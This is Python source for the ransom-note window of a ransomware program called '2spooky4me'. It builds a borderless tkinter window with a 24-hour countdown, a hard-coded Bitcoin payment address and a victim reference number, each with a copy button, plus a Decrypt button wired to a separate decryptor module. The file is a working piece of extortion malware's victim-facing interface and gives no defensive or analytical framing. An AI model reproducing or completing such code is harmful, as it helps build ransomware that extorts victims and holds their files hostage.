import tkinter as tk
from tkinter import ttk
import subprocess
from PIL import Image, ImageTk
import sys, os
from decryptor import decrypt_files

def run_countdown(reference_number):
    class CountdownApp:

        def copy_to_clipboard(self, text):
            self.root.clipboard_clear()
            self.root.clipboard_append(text)
            self.root.update()  # This ensures clipboard contents persist
            
        def __init__(self, root):
            self.root = root
            self.root.title("2spooky4me RANSOMWARE")

            # Remove the title bar and make the window borderless
            self.root.overrideredirect(True)

            # Prevent the window from being resizable
            self.root.resizable(False, False)

            # Define desired window dimensions
            desired_width = 827
            desired_height = 720

            # Calculate the center position
            screen_width = self.root.winfo_screenwidth()
            screen_height = self.root.winfo_screenheight()
            x_position = int((screen_width - desired_width) / 2)
            y_position = int((screen_height - desired_height) / 2)
            
            # If running as a bundled executable, use the appropriate path
            BASE_DIR = os.path.dirname(os.path.abspath(__file__))
            IMAGE_PATH = os.path.join(BASE_DIR, "2spookybgnew.jpg")
            self.image = Image.open(IMAGE_PATH)

            # Resize the image to fit desired window dimensions
            self.image = self.image.resize((desired_width, desired_height), Image.Resampling.LANCZOS)

            # Apply geometry
            self.root.geometry(f"{desired_width}x{desired_height}+{x_position}+{y_position}")

            self.bg_image = ImageTk.PhotoImage(self.image)
            bg_label = tk.Label(root, image=self.bg_image)
            bg_label.place(relwidth=1, relheight=1)

            # Set up time remaining and timer activity flag
            self.time_left = 24 * 60 * 60  # 24 hours in seconds
            self.timer_active = True  # Flag to determine if timer should continue

            # Countdown label at the top
            self.label = tk.Label(root, font=('sans', 40, 'bold'), bg="black", fg="white")
            #self.label.place(relx=0.5, rely=0.1, anchor='center')  # Adjusted the rely value
            self.label.place(x=desired_width//2, y=50, anchor='center')
           
            
            # Frame to hold the reference number and the copy button
            self.new_string = "1FfmbHfnpaZjKFvyi1okTjJJusN455paPH"
            self.btc_frame = tk.Frame(root, bg="black")
            self.btc_frame.place(relx=0.5, rely=0.51, anchor='center')  # Adjust the rely value to move up or down as needed

            # Display the reference number inside the frame
            self.new_string = "1FfmbHfnpaZjKFvyi1okTjJJusN455paPH"
            self.btc_label = tk.Label(self.btc_frame, text=f"{self.new_string}", font=('sans', 20, 'bold'), bg="black", fg="yellow")
            self.btc_label.pack(side=tk.LEFT, padx=(0, 10))  # padx adds some padding to the right of the reference number

            # Add the Copy button next to the reference number inside the frame
            self.copy_button_btc = tk.Button(self.btc_frame, text="Copy", command=lambda: self.copy_to_clipboard(self.new_string), bg="black", fg="red", font=('sans', 15))
            self.copy_button_btc.pack(side=tk.LEFT)

            # Frame to hold the reference number and the copy button
            self.ref_frame = tk.Frame(root, bg="black")
            self.ref_frame.place(relx=0.5, rely=0.663, anchor='center')  # Adjust the rely value to move up or down as needed

            # Display the reference number inside the frame
            self.ref_label = tk.Label(self.ref_frame, text=f"{reference_number}", font=('sans', 20, 'bold'), bg="black", fg="red")
            self.ref_label.pack(side=tk.LEFT, padx=(0, 10))  # padx adds some padding to the right of the reference number

            # Add the Copy button next to the reference number inside the frame
            self.copy_button_ref = tk.Button(self.ref_frame, text="Copy", command=lambda: self.copy_to_clipboard(reference_number), bg="black", fg="red", font=('sans', 15))
            self.copy_button_ref.pack(side=tk.LEFT)

            # Decryption status label just above the decrypt button
            self.decrypt_status_label = tk.Label(root, font=('sans', 20, 'bold'), bg="black")
            self.decrypt_status_label.place(relx=0.5, rely=0.82, anchor='center')

            # Decrypt button at the bottom
            self.decrypt_button = tk.Button(root, text="Decrypt", command=self.run_decryptor, font=('sans', 20, 'bold'), bg="red", fg="white")
            self.decrypt_button.place(relx=0.5, rely=0.92, anchor='center')  # Adjusted the rely value

            # Start countdown
            self.update_countdown()

        def update_countdown(self):
            """Update the countdown every second."""
            mins, sec = divmod(self.time_left, 60)
            hours, mins = divmod(mins, 60)
            self.label.configure(text=f"{hours:02d}:{mins:02d}:{sec:02d}")

            if self.time_left > 0 and self.timer_active:
                # Decrease the time_left by 1 second and then update the label
                self.time_left -= 1
                self.root.after(1000, self.update_countdown)

        def run_decryptor(self):
            """Run the decryption function."""
            
            self.show_message("Decryption Key Found!\nDecryption in Progress...", "yellow")
            self.root.update_idletasks()  # Force an update of the GUI
            
            decryption_success = decrypt_files()  # Call the function directly and store the return value

            if decryption_success:
                # Successful decryption
                self.show_message("Decryption Complete!\n Your files have been recovered.", "green")
                self.timer_active = False  # Stop the timer
                self.root.after(5000, self.root.destroy)  # Close the box after 5 seconds

            else:
                # Unsuccessful decryption
                self.show_message("Decryption Key Not Found", "red")

        def show_message(self, message, color):
            """Display a message in the specified color and hide it after 5 seconds."""
            self.decrypt_status_label.configure(text=message, fg=color)
            self.root.after(5000, lambda: self.decrypt_status_label.configure(text=""))

    root = tk.Tk()
    app = CountdownApp(root)
    root.mainloop()
